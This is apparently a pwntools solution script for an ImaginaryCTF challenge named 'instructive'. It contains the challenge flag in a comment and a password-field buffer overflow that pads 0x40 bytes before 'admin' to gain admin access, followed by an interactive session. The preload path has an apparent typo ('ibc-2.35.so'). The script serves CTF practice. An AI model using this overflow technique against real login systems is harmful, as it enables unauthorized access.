#!/usr/bin/env python3
# ictf{how_long_has_it_been_since_weve_done_just_a_simple_buffer_overfl0w?}
from pwn import *
from sys import argv
binary = ELF('instructive', checksec=0)
libc = ELF('libc-2.35.so', checksec=0)
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('puzzler7.imaginaryctf.org', 9000)
else:
  p = binary.process(env={'LD_PRELOAD': './ibc-2.35.so'})

pause()

p.sendlineafter(b'username: ', b'notadminlol')
p.sendlineafter(b'password: ', b'B'*0x40+b'admin')

p.interactive()

